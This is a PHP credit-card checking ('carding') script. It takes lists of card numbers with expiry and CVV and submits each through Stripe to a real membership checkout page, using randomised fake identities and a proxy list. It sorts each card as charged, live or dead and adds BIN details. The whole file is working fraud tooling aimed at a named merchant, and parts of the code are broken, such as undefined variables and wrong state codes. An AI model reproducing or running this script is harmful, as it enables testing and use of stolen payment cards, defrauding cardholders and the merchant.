<?php 
error_reporting(0);
//---------------------------------------//
$insane_site = "https://hazletonharp.org/membership-account/membership-checkout/?level=1" ;
$amt = "60$" ;
$gate = "Woo + Stripe";
$insane = "<a href='https://www.t.me/ONIEE_CHAN'>INSANE XD</a>"; /// PUT YOUR NAME ;
$live = "✅️";
$die = "❌";
$vbv = "⚠️";
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

# ------ Capture nonce -----$
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://becomaware.co.uk/membership-account/membership-checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: hazletonharp.org',
'method: POST',
'path: /membership-account/membership-checkout/?level=1',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://hazletonharp.org',
'referer: https://hazletonharp.org/membership-account/membership-checkout/?level=1',
   ));

# ----------------- [2req Postfields] ---------------------#

$nonreq = curl_exec($ch);
$nonce = trim(strip_tags(getStr($nonreq,'<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="','"')));

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8 ',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 13; 22111317I Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F2af5aa9c2a%3B+stripe-js-v3%2F2af5aa9c2a%3B+split-card-element&referrer=https%3A%2F%2Fhazletonharp.org&time_on_page=65913&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1NW1mZE0Vhcu1Gau');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));

#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://hazletonharp.org/membership-account/membership-checkout/?level=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: hazletonharp.org',
'method: POST',
'path: /membership-account/membership-checkout/?level=1',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://hazletonharp.org',
'referer: https://hazletonharp.org/membership-account/membership-checkout/?level=1',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 13; 22111317I Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'pmpro_level=1&checkjavascript=1&username='.$firstnane.'&password=opop9090&password2=opop9090&bemail='.$firstname.'%40gmail.com&bconfirmemail='.$firstname.'%40gmail.com&fullname=&CardType=visa&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account%2Fmembership-checkout%2F%3Flevel%3D1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$l4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');



$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
# ---------------------------------------#


////////////////////////////===[BIN Info]

$ch = curl_init();

$bin = substr($cc, 0, 6);

curl_setopt($ch, CURLOPT_URL, 'https://api.voidex.dev/api/bin?bin='.$bin.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata, true);
$brand = $binna['brand'];
$country = $binna['country'];
$cn = $binna['country_name']['country_flag'];
$country_currencies = $binna['country_currencies'];
$type = $binna['type'];
$category = $binna['category'];
$level = $binna['level'];
curl_close($ch);

#  // bin info end//      #

# ---------------- [Responses] ----------------- #

if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: PAYMENT INTENT CONFIRMED '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}

elseif(strpos($result2, "Your card has insufficient funds.")) {

  echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: INSUFFICIENT FUNDS '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}


elseif(strpos($result2, "incorrect_zip")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: INSUFFICIENT FUNDS '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, 'security code is incorrect.')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN LIVE '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}


    elseif(strpos($result2, 'security code is invalid.')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN LIVE '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}
    elseif(strpos($result2, "Security code is incorrect")) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN LIVE '.$amt.''.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}
    
elseif(strpos($result2, "transaction_not_allowed")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: TRANSACTION NOT ALLOWED '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: 3D '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}


elseif(strpos($result2, "Suspicious activity detected. Try again in a few minutes.")) {



 echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: Proxy Dead '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 
elseif(strpos($result2, "generic_decline")) {
 echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: GENERIC DECLINE '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.'</span><br> ';



} 

elseif(strpos($result2, "do_not_honor")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: DO NOT HONOR '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.'</span><br> ';



} 


elseif(strpos($result2, "fraudulent")) {
echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: FRAUDLENT '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 
elseif(strpos($result2, "intent_confirmation_challenge")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CAPTCHA '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 


elseif(strpos($result2, 'Your card was declined.')) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CARD DECLINED ❌ <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CARD DECLINED '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

}

elseif(strpos($result2, '"cvc_check": "pass"')) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.'</span><br> ';

}

elseif(strpos($result2, "three_d_secure_redirect")) {

 echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: 3D '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 

elseif(strpos($result2, "missing_payment_information")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: MISSING PAYMENT INFORMATION '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.'v</span><br>';



} 


elseif(strpos($result2, '"cvc_check": "fail"')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 

elseif(strpos($result2, "Membership Confirmation")) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "Thank you for your support!")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "Thank you for your donation")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "/wishlist-member/?reg=")) {

   echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "checkout completed")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "Successful")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "Thank You")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 

elseif(strpos($result2, "/donations/thank_you?donation_number=")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CVV CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';

} 


elseif(strpos($result2, "parameter_invalid_empty")) {

    echo '#DIE</span>  </span> ➣  CC:  '.$lista.'</span><br>  ➣ Result: '.$msg.'<br> ➣ Gate: Stripe '.$amt.' </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>'; 
exit;
}



elseif(strpos($result2, "Your card zip code is incorrect.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CARD DOESNT SUPPORT THIS TYPE OF PURCHASE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';



} 

elseif(strpos(result2, "Your card number is incorrect.")) {

echo '➣ #DIE CC:  '.$lista.'</span><br> ➣ Result: Card Number Is Incorrect '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>Bin Info:<br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';


} 



elseif(strpos($result2, "Your card is not supported.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CARD DOESNT SUPPORT THIS TYPE OF PURCHASE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>Bin Info:<br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br>';


} 


else {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: '.$msg.' '.$dcode.' '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>  Bin Info:<br> Bin '.$bin.'<br> Brand '.$brand.'<br> '.$country.' '.$cn.' <br> Type '.$type.' '.$level.'<br> Made By '.$insane.' </span><br> ';

} 


curl_close($ch);
ob_flush();
//echo $dcode;
//echo $result1;
//echo $result2;
?>
